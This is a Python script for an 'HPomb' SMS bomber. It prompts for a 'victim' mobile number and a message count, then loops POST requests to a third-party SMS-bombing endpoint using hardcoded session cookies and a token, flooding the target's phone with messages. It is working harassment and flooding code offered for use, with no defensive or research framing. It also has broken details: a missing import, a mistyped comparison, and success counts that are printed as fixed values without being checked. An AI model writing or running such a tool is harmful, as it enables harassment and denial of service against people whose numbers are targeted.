# colors values 
Red = '\033[1;31m'
Blue= '\033[1;36m'
Endc = '\033[0m'
line = '--------------------------------------------'
import requests
import sys
import os

def clr():
    try:
        if os.name == "nt":
            os.system('cls')
        else :
            os.system('clear')
    except:
            print(Blue+line,'\n')
            print('\n\tSomething Wrong to Clear ..\n\n       Please Contact To Developer ')
            print('\n\t     Error : 500\n')
            print(line)
            print(Red+'\n\t\t[ Sub Menu ]')
            print(Blue +'''\n[01] Contact To Developer\n[02] Again Run HPomb Tool''')
            error500 = input('\nChoose One Options : ')
            if error500 == 1:
                subprocess.call([sys.executable, 'core/contact.py'])
            else: 
                subprocess.call([sys.executable, 'hpomb.py'])
            


def banner():
    clr()
    verl = open("core/.version","r").read()
    global data
    userid = ""
    use_time = ""
    userd = 0
    if userd == '0' :
        userdiff = "Normal"
    elif userd == '1' :
        userdiff = "Silver"
    elif userd == '2' :
        userdiff = "Golden"
    else :
        userdiff = "Normal"
    
    logo="""
 ██░ ██  ██▓███   ▒█████   ███▄ ▄███▓ ▄▄▄▄   
▓██░ ██▒▓██░  ██▒▒██▒  ██▒▓██▒▀█▀ ██▒▓█████▄ 
▒██▀▀██░▓██░ ██▓▒▒██░  ██▒▓██    ▓██░▒██▒ ▄██
░▓█ ░██ ▒██▄█▓▒ ▒▒██   ██░▒██    ▒██ ▒██░█▀  
░▓█▒░██▓▒██▒ ░  ░░ ████▓▒░▒██▒   ░██▒░▓█  ▀█▓
 ▒ ░░▒░▒▒▓▒░ ░  ░░ ▒░▒░▒░ ░ ▒░   ░  ░░▒▓███▀▒
 ▒ ░▒░ ░░▒ ░       ░ ▒ ▒░ ░  ░      ░▒░▒   ░ 
 ░  ░░ ░░░       ░ ░ ░ ▒  ░      ░    ░    ░ 
 ░  ░  ░             ░ ░         ░    ░      
                                           ░ 
               ""","""
----------------     ----------------------
|   Secanon    |     | Version : """,verl,""" |
----------------     ----------------------

\tCreated by Honey Pots...

-------------------------------------------- 
 ID : """,userid,"""    USE : """,use_time,"""    USER : """,userdiff,"""        
-------------------------------------------- \n"""
    print(Red+logo[0]+Blue+logo[1]+logo[2]+logo[3]+logo[4]+logo[5]+logo[6]+logo[7]+logo[8]+logo[9])

banner()

country_code = input("Please Enter Country Code [ Default : +91 ] : ")
country_code = country_code.strip()
while int(len(country_code)) > 4 :
    print("\n--Sorry Invalid Input Country Code Only 3 digit--")
    country_code = input("\nPlease Re-enter Country Code [ Default : +91 ] : ")
    country_code = country_code.strip()

country_code_plus = country_code.find("+")

while country_code_plus >= 0 :
    country_code =  country_code.replace("+", "")
    country_code_plus = country_code.find("+")

if country_code == '' :
    country_code = "91"

mobile_number = input("\nPlease Enter Victim Mobile Number  : ")

while len(mobile_number) > 11 or len(mobile_number) <= 8 :
    mobile_number = input("\nInvalid Input ! Please Re-enter Mobile Number : ")    

request_number = input("\nPlease Enter Number of Massage : ")

while request_number.isdigit() != True :
    print("\n--Invalid Input ! Number Of Massage Enter In Digit--")
    request_number = input("\nPlease Enter Number of Massage : ")


def massage1():
    global mobile_number
    global country_code
    for i in range(1,201):
        banner()
        url = "https://mytoolstown.com/smsbomber/send/sendsms.php"

        header = {
        'Host': 'mytoolstown.com',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Content-Length':'110',
        'Origin': 'https://mytoolstown.com',
        'Connection':'close',
        'Referer': 'https://mytoolstown.com/smsbomber/'
        }

        Cookie={
            '__cfduid' : 'd006c051b8d0ac56e3fe87297911f97d11605880877',
            'PHPSESSID':'26febe5edcb9f19a44d664b70c7215f8',
            '_yeti_currency_new_3': '{"dataAsOf":"2020-11-19T10:00:45.911Z","conversions":{"USD":{"CAD":1.3072126727,"HKD":7.7523592855,"ISK":136.0802157061,"PHP":48.2532861476,"DKK":6.2787327267,"HUF":303.5473542299,"CZK":22.2455342096,"GBP":0.7530586451,"RON":4.1059993259,"SEK":8.6059150657,"IDR":14110.9959555106,"INR":74.1582406471,"BRL":5.3062015504,"RUB":75.8855746545,"HRK":6.3759689922,"JPY":103.8759689922,"THB":30.3201887428,"CHF":0.9110212336,"EUR":0.8426019548,"MYR":4.0874620829,"BGN":1.6479609033,"TRY":7.7148634985,"CNY":6.5571284125,"NOK":9.0255308392,"NZD":1.4446410516,"ZAR":15.4039433771,"USD":1,"MXN":20.2312942366,"SGD":1.3411695315,"AUD":1.3672059319,"ILS":3.3486686889,"KRW":1104.271991911,"PLN":3.7659251769},"GBP":{"CAD":1.7358710125,"HKD":10.2944961006,"ISK":180.7033444105,"PHP":64.0763989124,"DKK":8.337641122,"HUF":403.0859431819,"CZK":29.5402414599,"GBP":1,"RON":5.4524297047,"SEK":11.427948038,"IDR":18738.2430935517,"INR":98.4760498137,"BRL":7.0461996352,"RUB":100.7698074363,"HRK":8.4667628926,"JPY":137.9387510769,"THB":40.2627191657,"CHF":1.2097613373,"EUR":1.1189061573,"MYR":5.4278137693,"BGN":2.1883566625,"TRY":10.2447047766,"CNY":8.7073277164,"NOK":11.9851633044,"NZD":1.9183646068,"ZAR":20.4551710248,"USD":1.3279178275,"MXN":26.8654962908,"SGD":1.7809629306,"AUD":1.8155371309,"ILS":4.4467568505,"KRW":1466.3824645027,"PLN":5.0008391796}}}',
            '_ga': 'GA1.2.1536213637.1605852084',
            '_gid':'GA1.2.1125062803.1605852084',
            '__gads':'ID=65893a701e5da73c:T=1605880884:S=ALNI_MYD8hdq-BdDE_UXiZ9XYAsFQ6hbkA'
        }
    
        data = {
        'sendsms' : 'true',
        'mobno':mobile_number,
        'count':'200',
        'update':'0',
        'token':'f3995d09f9dad5cd46254cdbca0e7945',
        'countrycode':country_code,
        'smsno': i 
        }
        
        request = requests.post(url=url , data=data , headers=header,cookies=Cookie)
        output = request.json
        print(Blue)
        print("-------------------------------------------- ")
        print(Red +"                  Details "+Blue)
        print("   Target Number           : +" + str(country_code)+" ", mobile_number)
        print("   Number of Requests Sent : ", i)
        print("   Successful Requests     : ", i)
        print("   Failed Requests         : ", '0')
        print("-------------------------------------------- ")
        print("            Bombing In Progress")
        input()
def massage2():
    pass

for i in range(4):
    banner()
    massage1()
    massage2()